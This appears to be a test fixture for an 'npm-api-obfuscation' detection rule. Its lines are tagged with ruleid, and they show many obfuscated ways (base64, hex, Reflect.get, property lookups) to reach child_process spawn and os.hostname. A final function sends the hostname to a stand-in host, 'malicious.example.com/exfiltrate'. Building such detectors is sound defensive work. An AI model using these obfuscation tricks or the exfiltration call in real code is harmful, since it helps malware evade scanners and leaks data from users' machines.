// Tests for npm-api-obfuscation rule


function run_malicious_code() {
    const process = require('child_process');
    // process.spawn('node', ['malicious_script.js']);

    // Pattern 1: Direct property access
    // ruleid: npm-api-obfuscation
    process['spawn']('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process['spawn'].call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process['spawn'].apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    process['spawn'].bind({}, 'node', ['malicious_script.js'])();
    // Variations based on string obfuscation:
    // ruleid: npm-api-obfuscation
    process['sp' + 'awn']('node', ['malicious_script.js']);  // string concatenation
    str = "spawn";
    // ruleid: npm-api-obfuscation
    process[str]('node', ['malicious_script.js']);  // pass string via variable
    // ruleid: npm-api-obfuscation
    process[Buffer.from('c3Bhd24=', 'base64').toString('utf-8')]('node', ['malicious_script.js']);  // base64 encoded
    // ruleid: npm-api-obfuscation
    process[String.fromCharCode(0x73, 0x70, 0x61, 0x77, 0x6e)]('node', ['malicious_script.js']);  // hex encoded
    // ruleid: npm-api-obfuscation
    process[Buffer.from([0x73, 0x70, 0x61, 0x77, 0x6e]).toString()]('node', ['malicious_script.js']);  // hex encoded
    // ruleid: npm-api-obfuscation
    process["\x73\x70\x61\x77\x6e"]('node', ['malicious_script.js']);  // hex encoded

    // Pattern 2: Reflect.get()
    // ruleid: npm-api-obfuscation
    Reflect.get(process, 'spawn')('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Reflect.get(process, 'spawn').call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Reflect.get(process, 'spawn').apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    Reflect.get(process, 'spawn').bind({}, 'node', ['malicious_script.js'])();

    // Pattern 3: Object.getOwnPropertyDescriptor()
    // ruleid: npm-api-obfuscation
    Object.getOwnPropertyDescriptor(process, 'spawn').value('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.getOwnPropertyDescriptor(process, 'spawn').value.call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.getOwnPropertyDescriptor(process, 'spawn').value.apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    Object.getOwnPropertyDescriptor(process, 'spawn').value.bind({}, 'node', ['malicious_script.js'])();
    
    // Pattern 4: Object.getOwnPropertyNames() with find
    // ruleid: npm-api-obfuscation
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')]('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 5: Object.keys() with find
    // ruleid: npm-api-obfuscation
    process[Object.keys(process).find(name => name === 'spawn')]('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process[Object.keys(process).find(name => name === 'spawn')].call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    process[Object.keys(process).find(name => name === 'spawn')].apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    process[Object.keys(process).find(name => name === 'spawn')].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 6: Object.entries() with find
    // ruleid: npm-api-obfuscation
    Object.entries(process).find(([name, _]) => name === "spawn")[1]('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.entries(process).find(([name, _]) => name === "spawn")[1].call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.entries(process).find(([name, _]) => name === "spawn")[1].apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    Object.entries(process).find(([name, _]) => name === "spawn")[1].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 7: Object.entries() with filter
    // ruleid: npm-api-obfuscation
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1]('node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].call(process, 'node', ['malicious_script.js']);
    // ruleid: npm-api-obfuscation
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].apply({}, ['node', ['malicious_script.js']]);
    // ruleid: npm-api-obfuscation
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].bind({}, 'node', ['malicious_script.js'])();
}


function exfiltrate_data() {
    const os = require('os');
    const http = require('http');

    // Pattern 1: Direct property access
    // ruleid: npm-api-obfuscation
    host = os['hostname']();
    // ruleid: npm-api-obfuscation
    host = os['hostname'].call({});
    // ruleid: npm-api-obfuscation
    host = os['hostname'].apply({});
    // ruleid: npm-api-obfuscation
    host = os['hostname'].bind({})();
    // Variations based on string obfuscation:
    // ruleid: npm-api-obfuscation
    host = os['host' + 'name']();  // string concatenation
    str = "hostname";
    // ruleid: npm-api-obfuscation
    host = os[str]();  // pass string via variable
    // ruleid: npm-api-obfuscation
    host = os[Buffer.from('aG9zdG5hbWU=', 'base64').toString('utf-8')]();  // base64 encoded
    // ruleid: npm-api-obfuscation
    host = os[String.fromCharCode(0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65)]();  // hex encoded
    // ruleid: npm-api-obfuscation
    host = os[Buffer.from([0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65]).toString()]();  // hex encoded
    // ruleid: npm-api-obfuscation
    host = os["\x68\x6f\x73\x74\x6e\x61\x6d\x65"]();  // hex encoded

    // Pattern 2: Reflect.get()
    // ruleid: npm-api-obfuscation
    host = Reflect.get(os, 'hostname')();
    // ruleid: npm-api-obfuscation
    host = Reflect.get(os, 'hostname').call({});
    // ruleid: npm-api-obfuscation
    host = Reflect.get(os, 'hostname').apply({});
    // ruleid: npm-api-obfuscation
    host = Reflect.get(os, 'hostname').bind({})();

    // Pattern 3: Object.getOwnPropertyDescriptor()
    // ruleid: npm-api-obfuscation
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value();
    // ruleid: npm-api-obfuscation
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.call({});
    // ruleid: npm-api-obfuscation
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.apply({});
    // ruleid: npm-api-obfuscation
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.bind({})();

    // Pattern 4: Object.getOwnPropertyNames() with find
    // ruleid: npm-api-obfuscation
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')]();
    // ruleid: npm-api-obfuscation
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].call({});
    // ruleid: npm-api-obfuscation
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].apply({});
    // ruleid: npm-api-obfuscation
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].bind({})();

    // Pattern 5: Object.keys() with find
    // ruleid: npm-api-obfuscation
    host = os[Object.keys(os).find(name => name === 'hostname')]();
    // ruleid: npm-api-obfuscation
    host = os[Object.keys(os).find(name => name === 'hostname')].call({});
    // ruleid: npm-api-obfuscation
    host = os[Object.keys(os).find(name => name === 'hostname')].apply({});
    // ruleid: npm-api-obfuscation
    host = os[Object.keys(os).find(name => name === 'hostname')].bind({})();

    // Pattern 6: Object.entries() with find
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1]();
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].call({});
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].apply({});
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].bind({})();

    // Pattern 7: Object.entries() with filter
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1]();
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].call({});
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].apply({});
    // ruleid: npm-api-obfuscation
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].bind({})();

    const url = new URL('http://malicious.example.com/exfiltrate');

    const options = {
        hostname: url.hostname,
        port: 80,
        path: url.pathname + `?host=${host}`,
        method: "GET"
    };

    // ruleid: npm-api-obfuscation
    const req = http['request'](options, (res) => {
        res.on("data", () => { }); // ignore response
    });

    req.on("error", () => { });

    req.end();
}